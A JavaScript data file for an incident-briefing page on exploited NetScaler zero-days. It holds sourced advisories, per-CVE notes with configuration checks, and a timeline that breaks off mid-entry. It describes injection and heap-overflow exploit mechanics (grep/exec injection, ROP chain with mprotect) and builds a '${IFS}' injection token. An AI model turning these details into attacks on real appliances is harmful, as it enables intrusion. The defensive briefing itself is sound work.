/* PitScaler briefing - all page data lives in the objects below.
   Edit path: change or add entries here, keep every statement tied to a SOURCES id,
   then redeploy (see README.md). Rules: no backticks and no dollar-brace sequences
   in this file (the deploy wraps it in a raw template); build "$" + "{IFS}" instead. */
'use strict';

var IFS = '$' + '{IFS}';

/* ---------- Sources: exact URLs from the compiled dataset ---------- */
/* pending: true = did not load in automated check at build time (29 Sep 2026). URL kept as supplied. */
var SOURCES = {
  citrix:      { cat: 'official', label: 'Citrix - CTX697096 security bulletin (Sep 27)', url: 'https://support.citrix.com/external/article/CTX697096/citrix-netscaler-adc-and-citrix-netscale.html' },
  citrixsaml:  { cat: 'official', label: 'Citrix community blog - Security Update: Guidance for NetScaler SAML Authentication Deployments (Oct 2; new issue, independent of CTX697096)', url: 'https://community.citrix.com/techzone-blogs/110_security-updates/security-update-guidance-for-netscaler-saml-authentication-deployments/' },
  ctx694799:   { cat: 'official', label: 'Citrix - CTX694799 Steps to Take if NetScaler ADC is Suspected to be Compromised', url: 'https://support.citrix.com/external/article/CTX694799/steps-to-take-if-netscaler-adc-is-suspec.html' },
  citrixblog:  { cat: 'official', label: 'Citrix community blog - Security Bulletin for CVE-2026-88771 through CVE-2026-88778 (incl. IoC section; last updated Sep 30)', url: 'https://community.citrix.com/techzone-blogs/110_security-updates/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve-2026-88771-through-cve-2026-88778/', pending: true },
  citrixreddit: { cat: 'official', label: 'Citrix (CTX-Michael) on r/Citrix, Sep 27 - CRITICAL UPDATE announcement', url: 'https://www.reddit.com/r/Citrix/comments/1wro1yf/critical_update_citrix_netscaler_adc_and_citrix/' },
  ncdocs:      { cat: 'official', label: 'NetScaler Console documentation - Indicators of Compromise detection (incl. Citrix disclaimer on limits)', url: 'https://docs.netscaler.com/en-us/netscaler-console-service/instance-advisory/ioc' },
  cisa:        { cat: 'official', label: 'CISA alert - Critical zero-day vulnerabilities exploited in Citrix NetScaler ADC/Gateway (Sep 27)', url: 'https://www.cisa.gov/news-events/alerts/2026/09/27/critical-zero-day-vulnerabilities-exploited-citrix-netscaler-adc-gateway' },
  ncscnl:      { cat: 'official', label: 'NCSC-NL advisory NCSC-2026-0394, version 1.0.1 (Sep 30; probability high, damage high; per-CVE scores and preconditions)', url: 'https://advisories.ncsc.nl/2026/ncsc-2026-0394.html' },
  ncscuk:      { cat: 'official', label: 'NCSC-UK - Exploitation of vulnerabilities affecting Citrix NetScaler ADC and Gateway', url: 'https://www.ncsc.gov.uk/news/exploitation-of-vulnerabilities-affecting-citrix-netscaler-adc-and-citrix-netscaler-gateway' },
  csasg:       { cat: 'official', label: 'CSA Singapore - AL-2026-129', url: 'https://www.csa.gov.sg/alerts-and-advisories/alerts/al-2026-129/' },
  cccs:        { cat: 'official', label: 'Canadian Centre for Cyber Security - AL26-024', url: 'https://www.cyber.gc.ca/en/alerts-advisories/al26-024-critical-vulnerabilities-affecting-citrix-netscaler-adc-netscaler-gateway-cve-2026-88771-cve-2026-88772' },
  certfr:      { cat: 'official', label: 'CERT-FR alert CERTFR-2026-ALE-011 (Sep 28, updated Sep 30)', url: 'https://cert.ssi.gouv.fr/alerte/CERTFR-2026-ALE-011/' },
  cssf:        { cat: 'official', label: 'CSSF (Luxembourg) communique - Multiple Critical Vulnerabilities in Citrix NetScaler ADC and NetScaler Gateway (Sep 28)', url: 'https://www.cssf.lu/en/2026/09/multiple-critical-vulnerabilities-in-citrix-netscaler-adc-and-netscaler-gateway/' },
  certqc:      { cat: 'official', label: 'CERT Quebec CERTQC-AVIS-2026-364 (Sep 28, TLP:CLEAR)', url: 'https://www.cyber.gouv.qc.ca/avis/certqc-avis-2026-364' },
  hkcert:      { cat: 'official', label: 'HKCERT - Citrix Products Multiple Vulnerabilities (Sep 28)', url: 'https://www.hkcert.org/security-bulletin/citrix-products-multiple-vulnerabilities_20260928' },
  acsc:        { cat: 'official', label: 'ACSC (Australia) - Critical vulnerabilities in Citrix NetScaler ADC and NetScaler Gateway', url: 'https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/critical-vulnerabilities-in-citrix-netscaler-adc-and-citrix-netscaler-gateway-products' },
  bsi:         { cat: 'official', label: 'BSI (Germany) - Citrix NetScaler: Systeme werden ueber ZeroDay-Schwachstellen angegriffen, BITS-H 2026-289305-1132, version 1.1 (Oct 1, TLP:CLEAR)', url: 'https://www.bsi.bund.de/SharedDocs/Cybersicherheitswarnungen/DE/2026/2026-289305-1032.pdf?__blob=publicationFile&v=4' },
  kev:         { cat: 'official', label: 'CISA Known Exploited Vulnerabilities catalog (both CVEs added Sep 27, due Sep 30)', url: 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog' },
  certeuadv:   { cat: 'official', label: 'CERT-EU Security Advisory 2026-014 - Critical Vulnerabilities in Citrix NetScaler ADC and Gateway (Sep 27)', url: 'https://cert.europa.eu/publications/security-advisories/2026-014/' },
  dkcert:      { cat: 'official', label: 'DKCERT (CERT for Danish universities and research) - To kritiske NetScaler 0-dage udnyttes aktivt før patch (Sep 29)', url: 'https://cert.dk/node/639' },
  nhs:         { cat: 'official', label: 'NHS England Digital cyber alert CC-4858 (Sep 28) - Exploitation of zero-day vulnerabilities affecting Citrix NetScaler', url: 'https://digital.nhs.uk/cyber-alerts/2026/cc-4858' },
  circl:       { cat: 'official', label: 'CIRCL TR-100 - per-CVE configuration-check CLI commands', url: 'https://www.circl.lu/pub/tr-100/' },

  certeu:      { cat: 'research', label: 'CERT-EU - Taking "execute logging" a bit too literally - CVE-2026-88771 (Sep 28)', url: 'https://www.cert.europa.eu/blog/taking-execute-logging-a-bit-too-literally-cve-2026-88771' },
  wt1:         { cat: 'research', label: 'watchTowr Labs part 1 - Oh Look, the Foot Gun Went Off Again (CVE-2026-88771) (Sep 28)', url: 'https://labs.watchtowr.com/oh-look-the-foot-gun-went-off-again-citrix-netscaler-preauth-command-injection-cve-2026-88771/' },
  wt1tool:     { cat: 'research', label: 'watchTowr Detection Artefact Generator - CVE-2026-88771 (GitHub)', url: 'https://github.com/watchtowrlabs/watchTowr-vs-Citrix-Netscaler-CVE-2026-88771' },
  wt2:         { cat: 'research', label: 'watchTowr Labs part 2 - Here We Go Again (CVE-2026-88772), Sina Kheirkhah (Sep 29)', url: 'https://labs.watchtowr.com/here-we-go-again-citrix-netscaler-dtls-preauth-memory-overflow-cve-2026-88772/' },
  wt2tool:     { cat: 'research', label: 'watchTowr Detection Artefact Generator - CVE-2026-88772 (GitHub)', url: 'https://github.com/watchtowrlabs/watchTowr-vs-Citrix-Netscaler-CVE-2026-88772' },

  gnblog:      { cat: 'telemetry', label: 'GreyNoise - Swarming Against Citrix 0-Day Exploitation (TLP:CLEAR IoCs, Sep 28)', url: 'https://www.greynoise.io/blog/swarming-against-citrix-0-day-exploitation' },
  gnchron:     { cat: 'telemetry', label: 'GreyNoise Chronicle - GNTL-20260928 CVE-2026-88771 timeline', url: 'https://www.greynoise.io/chronicle/gntl-20260928-citrix-cve-2026-88771' },
  gnip:        { cat: 'telemetry', label: 'GreyNoise Visualizer - IP 149.104.78.141', url: 'https://viz.greynoise.io/ip/149.104.78.141' },
  gntag:       { cat: 'telemetry', label: 'GreyNoise tag - Citrix NetScaler CVE-2026-88771 Login Command Injection RCE Attempt', url: 'https://viz.greynoise.io/tag/citrix-netscaler-cve-2026-88771-login-command-injection-rce-attempt' },

  kb1:         { cat: 'beaumont', label: 'Beaumont, Sep 27 - chained CVEs, webshells all September, "Probably nation state aligned"', url: 'https://cyberplace.social/@GossiTheDog/117343729453093307' },
  kb2:         { cat: 'beaumont', label: 'Beaumont, Sep 27 - patches live; detection script behind NDA; patching does not remove backdoors', url: 'https://cyberplace.social/@GossiTheDog/117343821114841048' },
  kb3:         { cat: 'beaumont', label: 'Beaumont, Sep 27 - Console check misses attempts when logs have rotated', url: 'https://cyberplace.social/@GossiTheDog/117345540231975640' },
  kb4:         { cat: 'beaumont', label: 'Beaumont, Sep 28 22:49 UTC - names "PitScaler", >100 victim orgs (his claim)', url: 'https://cyberplace.social/@GossiTheDog/117351107654208046' },
  kb5:         { cat: 'beaumont', label: 'Beaumont, Sep 28 23:02 UTC - Citrix checker incomplete (suid /bin/sh)', url: 'https://cyberplace.social/@GossiTheDog/117351155381900219' },
  kb6:         { cat: 'beaumont', label: 'Beaumont, Sep 29 04:39 UTC - mass exploitation, <10% patched (his claim)', url: 'https://cyberplace.social/@GossiTheDog/117352481501981552' },
  kb7:         { cat: 'beaumont', label: 'Beaumont, Sep 29 06:18 UTC - public message to the NSA (his unverified claim)', url: 'https://cyberplace.social/@GossiTheDog/117352869498139711' },
  kb8:         { cat: 'beaumont', label: 'Beaumont, Sep 29 16:12 UTC - IR vendors publishing victim-unique webshell names', url: 'https://cyberplace.social/@GossiTheDog/117355208096613386' },

  kb9:         { cat: 'beaumont', label: 'Beaumont, Sep 28 15:13 UTC - GitHub "PoCs" for the new Citrix vulns are "fake AI slop"', url: 'https://cyberplace.social/@GossiTheDog/117349313638958333' },
  kb10:        { cat: 'beaumont', label: 'Beaumont, Sep 29 18:32 UTC - Dutch government shuts down all Citrix NetScalers (relaying @bert_hubert)', url: 'https://cyberplace.social/@GossiTheDog/117355758746619146' },
  kb11:        { cat: 'beaumont', label: 'Beaumont, Oct 1 00:12 UTC - Arctic Wolf IoCs cover follow-up "spray and pray" activity, not the early-September actor', url: 'https://cyberplace.social/@GossiTheDog/117362758120876296' },
  kb12:        { cat: 'beaumont', label: 'Beaumont, Oct 2 19:01 UTC - patched 13.1 and 14.1 honeypots are crashing; "we may have #PitScaler 2 on our hands" (with two screenshots of an unattributed write-up)', url: 'https://cyberplace.social/@GossiTheDog/117372857146978531' },
  kb13:        { cat: 'beaumont', label: 'Beaumont, Oct 2 20:00 UTC - Citrix has published a blog on the new SAML issue', url: 'https://cyberplace.social/@GossiTheDog/117373090409884785' },
  kb14:        { cat: 'beaumont', label: 'Beaumont, Oct 2 19:02 UTC - "to be confirmed but it looks like the pitboss fix is bypassable"', url: 'https://cyberplace.social/@GossiTheDog/117372864244958549' },
  kb15:        { cat: 'beaumont', label: 'Beaumont, Oct 2 19:19 UTC - one patched honeypot is running a downloaded binary; "sprayed and prayed"', url: 'https://cyberplace.social/@GossiTheDog/117372929427365765' },
  nlgov:       { cat: 'official', label: 'Dutch government letter to parliament - Kwetsbaarheden Citrix Netscaler (2026D47262, Sep 29)', url: 'https://www.tweedekamer.nl/kamerstukken/brieven_regering/detail?id=2026D47262&did=2026D47262' },

  cverec:      { cat: 'official', label: 'CVE.org - CVE-2026-88771 record (reserved Sep 10 07:14 UTC by NetScaler; published Sep 27 16:02 UTC)', url: 'https://www.cve.org/CVERecord?id=CVE-2026-88771' },
  bleeping2:   { cat: 'press', label: 'BleepingComputer (Sep 29) - Hackers exploit Citrix NetScaler zero-day to deploy web shells', url: 'https://www.bleepingcomputer.com/news/security/hackers-exploit-citrix-netscaler-zero-day-to-deploy-web-shells/' },
  bleeping:    { cat: 'press', label: 'BleepingComputer (Sep 27) - Citrix admins warned to shut down NetScalers', url: 'https://www.bleepingcomputer.com/news/security/citrix-admins-warned-to-shut-down-netscalers-over-2-exploited-zero-days/' },
  stack:       { cat: 'press', label: 'The Stack (Oct 1) - Banks, gov\'ts, telcos hit by hackers amid escalating NetScaler incident', url: 'https://www.thestack.technology/banks-govts-telcos-hit-by-hackers-amid-escalating-netscaler-incident-2/' },
  helpnet930:  { cat: 'press', label: 'Help Net Security (Sep 30) - Suspected state-sponsored hackers exploited NetScaler zero-day since early September (CVE-2026-88772)', url: 'https://www.helpnetsecurity.com/2026/09/30/cve-2026-88772-netscaler-exploitation-zero-day/' },
  cfwaf:       { cat: 'press', label: 'Cloudflare changelog (Oct 1) - WAF Release 2026-10-01, Emergency: Citrix NetScaler CVE-2026-88771 managed rule', url: 'https://developers.cloudflare.com/changelog/post/2026-10-01-emergency-waf-release/' },
  qualys:      { cat: 'press', label: 'Qualys ThreatPROTECT (Sep 28) - Citrix NetScaler zero-day vulnerabilities exploited in attacks', url: 'https://threatprotect.qualys.com/2026/09/28/citrix-netscaler-adc-and-gateway-zero-day-vulnerabilities-exploited-in-attacks-cve-2026-88771-cve-2026-88772/' },
  thn1001:     { cat: 'press', label: 'The Hacker News (Oct 1) - Citrix NetScaler post-exploitation payload creates superuser, maps web shell to CSS-like URLs', url: 'https://thehackernews.com/2026/10/citrix-netscaler-post-exploitation.html' },
  bccisa:      { cat: 'press', label: 'BleepingComputer (Sep 28) - CISA orders feds to patch exploited Citrix flaws by Wednesday', url: 'https://www.bleepingcomputer.com/news/security/cisa-orders-feds-to-patch-exploited-citrix-flaws-by-wednesday/' },
  secweek:     { cat: 'press', label: 'SecurityWeek (Sep 28) - Citrix confirms 2 NetScaler zero-days', url: 'https://www.securityweek.com/citrix-confirms-2-netscaler-zero-days-after-admins-pulled-the-plug/' },
  record:      { cat: 'press', label: 'The Record (Sep 28) - US, UK warn of Citrix NetScaler zero-day bug', url: 'https://therecord.media/us-uk-warn-of-citrix-netscaler-zero-day-bug' },
  cyberscoop:  { cat: 'press', label: 'CyberScoop (Sep 28) - delayed-disclosure angle', url: 'https://cyberscoop.com/citrix-zero-days-delayed-disclosure/' },
  sophos:      { cat: 'press', label: 'Sophos CTU (Sep 28) - CVE-2026-88771 / -88772 in active exploitation', url: 'https://www.sophos.com/en-us/blog/citrix-netscaler-cve-2026-88771-cve-2026-88772-in-active-exploitation' },
  rapid7:      { cat: 'press', label: 'Rapid7 ETR (Sep 28, last updated Sep 30)', url: 'https://www.rapid7.com/blog/post/etr-zero-day-exploitation-of-citrix-netscaler-adc-and-gateway-cve-2026-88771-and-cve-2026-88772/' },
  wtfaq:       { cat: 'press', label: 'watchTowr FAQ (Sep 27-28)', url: 'https://watchtowr.com/intelligence/citrix-netscaler-zero-day-vulnerabilities-faq/' },

  ifin:        { cat: 'telemetry', label: 'IFIN - Multiple Citrix Netscaler 0-Days Exploited (tracking thread, from Sep 26; observables "shared without restriction")', url: 'https://ifin.network/t/multiple-citrix-netscaler-0-days-exploited/867' },
  truesec:     { cat: 'research', label: 'Truesec - Multiple Critical Vulnerabilities in Citrix NetScaler ADC and NetScaler Gateway (Sep 28)', url: 'https://www.truesec.com/hub/blog/multiple-critical-vulnerabilities-in-citrix-netscaler-adc-and-netscaler-gateway' },

  gtig:        { cat: 'research', label: 'Google GTIG / Mandiant - Defending Against Active Exploitation of Citrix NetScaler ADC and Gateway Appliances (Sep 29)', url: 'https://cloud.google.com/blog/topics/threat-intelligence/defending-against-active-exploitation-of-citrix-netscaler-adc-and-gateway-appliances' },
  nextron:     { cat: 'research', label: 'Nextron Systems (Florian Roth) - New THOR Detection Coverage for CVE-2026-88771 and CVE-2026-88772 (Sep 29)', url: 'https://www.nextron-systems.com/2026/09/29/new-thor-detection-coverage-for-citrix-netscaler-cve-2026-88771-and-cve-2026-88772/' },
  register:    { cat: 'press', label: 'The Register (Sep 29) - Custom malware used in Citrix 0-day attacks targeting govt, banks, professional services', url: 'https://www.theregister.com/security/2026/09/29/custom-malware-used-in-citrix-0-day-attacks-targeting-govt-banks-professional-services/5299867' },
  unit42:      { cat: 'press', label: 'Unit 42 (Palo Alto Networks) - NetScaler zero-days threat brief (Sep 27, updated Sep 28 and Sep 30 with pre- and post-disclosure activity and IoCs)', url: 'https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/' },
  arcticwolf:  { cat: 'research', label: 'Arctic Wolf - Citrix NetScaler Active Exploitation via CVE-2026-88771 (IoC pack, Sep 30)', url: 'https://github.com/rtkwlf/wolf-tools/tree/main/pack_alerts/202609-citrix-netscaler-active-exploitation-cve-2026-88771' },
  sygnia:      { cat: 'research', label: 'Sygnia - Actively Exploited NetScaler Vulnerabilities (IR-based advisory, Sep 30)', url: 'https://www.sygnia.co/threat-reports-and-advisories/actively-exploited-netscaler-vulnerabilities/' },
  tenex:       { cat: 'research', label: 'TENEX - What TENEX Observed Inside Active Exploitation of CVE-2026-88771 (Sep 30)', url: 'https://tenex.ai/blog/what-tenex-observed-inside-active-exploitation-of-netscaler-zero-day/' },
  poppchecker: { cat: 'research', label: 'Poppelgaard - NetScaler CTX697096 checker (free read-only script; v1.9 Oct 1, v1.11 Oct 2)', url: 'https://github.com/ThomasPoppelgaard/netscaler-ctx697096-checker' },
  poppel:      { cat: 'research', label: 'Poppelgaard - CVE-2026-88771 through CVE-2026-88778, what you should know and how to fix (Sep 28, last updated Oct 2)', url: 'https://www.poppelgaard.com/cve-2026-88771-through-cve-2026-88778-what-you-should-know-and-how-to-fix-your-netscaler-adc-netscaler-gateway' },
  levelblue:   { cat: 'research', label: 'LevelBlue SpiderLabs (THOR team) - CVE-2026-88771 Observed Exploitation Artifacts and Hunt Indicators (Sep 30; own findings, not independently confirmed)', url: 'https://www.levelblue.com/blogs/spiderlabs-blog/citrix-netscaler-cve-2026-88771-observed-exploitation-artifacts-and-hunt-indicators' },

  censys:      { cat: 'telemetry', label: 'Censys advisory - NetScaler exposure (42,735 hosts, Sep 28)', url: 'https://censys.com/advisory/cve-2026-10747-2/' },
  cydive:      { cat: 'press', label: 'Cybersecurity Dive (Sep 28) - Shadowserver: more than 20,000 instances exposed', url: 'https://www.cybersecuritydive.com/news/citrix-upgrades-netscaler-exploitation/831502/' },
  helpnet:     { cat: 'press', label: 'Help Net Security (Sep 29) - NetScaler zero-day exploitation escalates into mass attacks (Lupovis, Censys)', url: 'https://www.helpnetsecurity.com/2026/09/29/netscaler-zero-day-exploitation-escalates-into-mass-attacks-cve-2026-88771/' },
  beazley:     { cat: 'research', label: 'Beazley Security advisory (updated Sep 29) - IoC table incl. Lupovis honeypot IPs', url: 'https://beazley.security/alerts-advisories/critical-vulnerability-in-citrix-netscaler-zero-day-prompts-emergency-shutdowns-cve-2026-88771-cve-2026-88772' },
  corelight:   { cat: 'research', label: 'Corelight - Hunting Citrix NetScaler zero-days (Zeek queries, Sep 28)', url: 'https://corelight.com/blog/hunting-citrix-netscaler-zero-days-corelight' },
  elastic:     { cat: 'research', label: 'Elastic detection rule - Potential NetScaler Log Poisoning Command Injection Attempt (merged Sep 28)', url: 'https://github.com/elastic/detection-rules/blob/main/rules/network/initial_access_netscaler_log_poisoning_command_injection.toml' },
  sigma:       { cat: 'research', label: 'SigmaHQ pull request #6352 - NetScaler auth endpoint shell metacharacters (open, Sep 29)', url: 'https://github.com/SigmaHQ/sigma/pull/6352' },
  nuclei:      { cat: 'research', label: 'Nuclei templates pull request #17336 - CVE-2026-88771 active probe (open, Sep 28)', url: 'https://github.com/projectdiscovery/nuclei-templates/pull/17336' },

  defused:     { cat: 'telemetry', label: 'Defused (@DefusedCyber) on X, Sep 29 - decoy hits across multiple CVE-2026-88771 paths', url: 'https://x.com/DefusedCyber/status/2104888497693708505' },

  esentire:    { cat: 'research', label: 'eSentire TRU - Update: ongoing exploitation of NetScaler CVE-2026-88771 / -88772 (first-hand IR, Sep 29)', url: 'https://www.esentire.com/security-advisories/update-ongoing-exploitation-of-citrix-netscaler-adc-and-netscaler-gateway-vulnerabilities-cve-2026-88771-cve-2026-88772' },

  bsl:         { cat: 'research', label: 'Beazley Security Labs - BSL-A1216 advisory (updates 3-4, Sep 29): consolidated IoCs and hunting commands', url: 'https://labs.beazley.security/advisories/BSL-A1216' },

  ingdk:       { cat: 'press', label: 'Ingeniøren (Sep 30) - Alvorlige huller i kendt software: PET, Forsvaret og Politiet hastelukker systemer', url: 'https://ing.dk/artikel/alvorlige-huller-i-kendt-software-pet-forsvaret-og-politiet-hastelukker-systemer' },
  sdx:         { cat: 'press', label: 'SDxCentral (Sep 29) - NetScaler bugs bring critical sectors down in Europe (citing Techzine)', url: 'https://www.sdxcentral.com/news/netscaler-bugs-bring-critical-sectors-down-in-europe/' },
  cydive2:     { cat: 'press', label: 'Cybersecurity Dive (Sep 29) - Citrix NetScaler exploitation began days before public notification', url: 'https://www.cybersecuritydive.com/news/citrix-netscaler-exploitation-days-before-notification/831634/' },
  heise:       { cat: 'press', label: 'heise online (Sep 27) - New zero-day exploits in Citrix NetScaler', url: 'https://www.heise.de/en/news/Security-researchers-warn-New-zero-day-exploits-in-Citrix-Netscaler-11467269.html' },

  darkreading: { cat: 'press', label: 'Dark Reading (Sep 29) - Dual NetScaler Zero-Days Trigger Chaos for Citrix Customers', url: 'https://www.darkreading.com/vulnerabilities-threats/netscaler-zero-days-chaos-citrix' },
  lupovisx:    { cat: 'telemetry', label: 'Lupovis (@LupovisDefence) on X, Sep 28 - decoys catch CVE-2026-88771 exploitation hours after the PoC', url: 'https://x.com/lupovisdefence/status/2104595071362326680' },

  watchtowrx:  { cat: 'research', label: 'watchTowr (@watchtowrcyber) on X, Sep 26 - "Unpatched, 0days. Exploited in-the-wild - discovered during forensics."', url: 'https://x.com/watchtowrcyber/status/2103972792043479307' },

  maurice:     { cat: 'community', label: 'Maurice_Sec on X - notes from the field on NetScaler Console IoC scanner findings', url: 'https://x.com/Maurice_Sec/status/2104541998858240487' },

  omroepbrabant: { cat: 'press', label: 'Omroep Brabant (Sep 27) - Storing bij ziekenhuizen door kritieke kwetsbaarheden in systeem (Amphia, ETZ, Z-CERT)', url: 'https://www.omroepbrabant.nl/nieuws/6028828/storing-bij-ziekenhuizen-door-kritieke-kwetsbaarheden-in-systeem' },
  cybermaxx:   { cat: 'research', label: 'CyberMaxx - Patches required: Citrix NetScaler vulns exploited in the wild (IoC notes)', url: 'https://www.cybermaxx.com/resources/patches-required-citrix-netscaler-vulns-exploited-in-the-wild-cve-2026-88771-and-cve-2026-88772/' },

  reddit:      { cat: 'community', label: 'r/Citrix - "Netscaler leak?" thread (~Sep 26)', url: 'https://www.reddit.com/r/Citrix/comments/1wqjk9a/netscaler_leak/' },
  redditasm:   { cat: 'community', label: 'r/Citrix - comment by asmOne (about 29 Sep; date approximate) quoting log-poison attempts', url: 'https://www.reddit.com/r/Citrix/comments/1wqjk9a/comment/pcub9wh/' }
};

var SOURCE_CATS = [
  ['official', 'Primary official advisories'],
  ['research', 'Technical research'],
  ['telemetry', 'Telemetry and IoCs'],
  ['beaumont', 'Kevin Beaumont (@GossiTheDog) - attributed posts, claims not independently verified'],
  ['press', 'Press and vendor coverage'],
  ['community', 'Community']
];

/* ---------- CVEs (bulletin CTX697096) ---------- */
var CVES = [
  { id: 'CVE-2026-88771', kind: 'hot', status: 'Exploited in the wild', score: 'CVSS 4.0: 9.5 Critical',
    rows: [
      ['Type', 'Improper input validation; unauthenticated remote command execution.', ['citrix']],
      ['Exposure', 'Affects the DEFAULT configuration; no features need to be enabled.', ['citrix']],
      ['Root cause (CERT-EU)', '/netscaler/ns_monuploadd_err.pl passes unsanitised input to grep+exec; a tail -1 race condition is also involved.', ['certeu']],
      ['Status', 'Exploited in the wild; in CISA KEV since Sep 27.', ['citrix', 'cisa']]
    ] },
  { id: 'CVE-2026-88772', kind: 'hot', status: 'Exploited in the wild', score: 'CVSS 4.0: 9.5 Critical',
    rows: [
      ['Type (Citrix)', 'Memory overflow leading to RCE or DoS when DTLS is enabled.', ['citrix']],
      ['Exposure', 'DTLS is ON by default on VPN virtual servers unless the admin sets -dtls OFF.', ['citrix']],
      ['Campaign (GTIG/Mandiant)', 'Exploited since at least early September. Exploitation crashes the NSPPE packet engine and gives root-level access. Organisations in North America and Europe in government, financial services, education and legal/professional services were likely impacted.', ['gtig']],
      ['Mechanics (watchTowr)', 'Preauth heap overflow in the DTLS stack (nsppe process); 137,825 bytes written past the buffer; control gained via an overwritten global list pointer, then a ROP chain calling mprotect and jumping to shellcode - full RCE, not just DoS.', ['wt2']],
      ['Status', 'Exploited in the wild; in CISA KEV since Sep 27.', ['citrix', 'cisa']],
      ['Config check (Citrix)', 'Citrix: a Gateway is vulnerable unless DTLS is explicitly disabled. add vpn vserver vpn1 SSL 10.0.0.0 443 -Listenpolicy NONE means DTLS is on by default; the same line with -dtls OFF means it is off. add vpn vserver vs1 DTLS 10.11.1.1 443 and add lb vserver vd_dtls DTLS 10.146.111.74 443 mean DTLS is enabled.', ['citrix']]
    ] },
  { id: 'CVE-2026-88773', kind: 'chain', status: 'Chain component according to Beaumont', score: 'CVSS 4.0: 9.3 Critical',
    rows: [
      ['Type', 'HTTP request smuggling (CWE-444).', ['citrix', 'ncscnl']],
      ['Precondition', 'HTTP configuration enabled on NetScaler ADC or Gateway. No authentication or user interaction needed (NCSC-NL).', ['citrix', 'ncscnl']],
      ['Role (Beaumont)', 'Used in a chain with CVE-2026-88771 and CVE-2026-88772 in the original attacks, according to Beaumont. Not independently confirmed; no source reports it exploited on its own.', ['kb1']],
      ['Config check (Citrix)', 'Citrix: met when load balancing, content switching, VPN or authentication virtual servers of type HTTP or SSL exist (add lb, cs, vpn or authentication vserver, followed by a name and HTTP or SSL).', ['citrix']]
    ] },
  { id: 'CVE-2026-88774', kind: 'other', status: 'No exploitation reported', score: 'CVSS 4.0: 7.0',
    rows: [
      ['Type', 'Feature policy bypass due to improper HTTP URL-based expression usage (CWE-16).', ['citrix', 'ncscnl']],
      ['Precondition', 'Any policy expression configured with an HTTP URL-based expression.', ['citrix']],
      ['Config check (Citrix)', 'Citrix: the same virtual-server check as CVE-2026-88773 (HTTP or SSL virtual servers on LB, CS, VPN or authentication).', ['citrix']]
    ] },
  { id: 'CVE-2026-88775', kind: 'other', status: 'No exploitation reported', score: 'CVSS 4.0: 8.8',
    rows: [
      ['Type', 'Memory overflow leading to unpredictable behaviour or denial of service (CWE-119).', ['citrix', 'ncscnl']],
      ['Precondition', 'Configured as a Gateway (SSL VPN, ICA Proxy, CVPN, RDP Proxy) or AAA virtual server.', ['citrix']],
      ['Config check (Citrix)', 'Citrix: look for configuration lines matching add vpn vserver .* (Gateway) or add authentication vserver .* (AAA).', ['citrix']]
    ] },
  { id: 'CVE-2026-88776', kind: 'other', status: 'No exploitation reported', score: 'CVSS 4.0: 8.8',
    rows: [
      ['Type', 'Memory overflow leading to unpredictable behaviour or denial of service (CWE-119).', ['citrix', 'ncscnl']],
      ['Precondition', 'Load Balancing virtual server of type Oracle.', ['citrix']],
      ['Config check (Citrix)', 'Citrix: look for a configuration line matching add lb vserver.*ORACLE.*', ['citrix']]
    ] },
  { id: 'CVE-2026-88777', kind: 'other', status: 'No exploitation reported', score: 'CVSS 4.0: 8.8',
    rows: [
      ['Type', 'Memory overflow leading to unpredictable behaviour or denial of service (CWE-119).', ['citrix', 'ncscnl']],
      ['Precondition', 'LB/CS or CGNAT-LSN/NAT64 device with a non-HTTP L7 protocol feature enabled.', ['citrix']],
      ['Config check (Citrix)', 'Citrix gives case-insensitive configuration-text patterns (not CLI commands) to search in /nsconfig/ns.conf or show ns runningConfig: FTP over LB or CS (add (lb|cs) vserver .* FTP, add service .* FTP), FTP health monitors (add lb monitor .* FTP or FTP-EXTENDED), LSN groups (add lsn group .*; FTP ALG counts as enabled unless set lsn group .* -ftp DISABLED is present), RTSP (set lsn group .* -rtspalg ENABLED), DNS64 (add lb vserver .* DNS .* -dns64 ENABLED; add dns policy64 counts only if bound to a DNS virtual server) and NAT64 (add nat64).', ['citrix']]
    ] },
  { id: 'CVE-2026-88778', kind: 'other', status: 'No exploitation reported', score: 'CVSS 4.0: 8.8',
    rows: [
      ['Type', 'TCP Initial Sequence Number (ISN) prediction (CWE-342).', ['citrix', 'ncscnl']],
      ['Precondition', 'TCP configuration enabled. CIRCL gives a CLI check for disabled Enhanced ISN Generation.', ['citrix', 'circl']],
      ['Fix', 'Closed by enabling Enhanced ISN Generation; the upgrade alone does not fix it.', ['citrix', 'wtfaq', 'certeuadv']],
      ['Config check (Citrix)', 'Citrix: both must be true. (1) At least one virtual server of type HTTP, SSL, SSL_BRIDGE, TCP, SSL_TCP, FTP, NNTP, RTSP, RDP, DNS_TCP, DOT, SIP_TCP, SIP_SSL, DIAMETER, SSL_DIAMETER, MYSQL, MSSQL, ORACLE, SMPP, MQTT, MQTT_TLS, MONGO, MONGO_TLS, PROXY, SSL_PROXY, USER_TCP or USER_SSL_TCP. (2) show ns tcpparam | grep "Enhanced ISN Generation" returns DISABLED.', ['citrix']]
    ] }
];

/* ---------- Timeline (UTC; time: null = no time given) ---------- */
/* kind: official | research | telemetry | reported. approx: date is approximate. deadline: future deadline. */
var TIMELINE = [
  { date: '2026-10-02', time: '19:02', kind: 'reported', title: 'Beaumont: the pitboss fix "looks bypassable" (to be confirmed)',
    body: 'In a reply to his honeypot post, Beaumont says that, to be confirmed, it looks like the pitboss fix is bypassable. He gives no technical detail, and Citrix has not said whether builds with the CTX697096 fixes are affected by the new SAML issue.', cite: ['kb14'],
    validated: 'Post text read directly on 2 Oct.' },
  { date: '2026-10-02', time: '19:19', kind: 'reported', title: 'Beaumont: a patched honeypot is running a downloaded binary',
    body: 'Beaumont says one of his honeypots is running a downloaded (malware) binary, that both were patched so he concludes it is a new vulnerability, and that it is being sprayed and prayed. One honeypot has no valid TLS certificate because he let it expire. He does not say whether the honeypots had SAML configured, and Citrix lists no affected versions yet. These are one researcher\'s observations and conclusions.', cite: ['kb15'],
    validated: 'Post text read directly on 2 Oct.' },
  { date: '2026-10-02', time: '19:01', kind: 'reported', title: 'Beaumont: patched honeypots crash, "we may have PitScaler 2"',
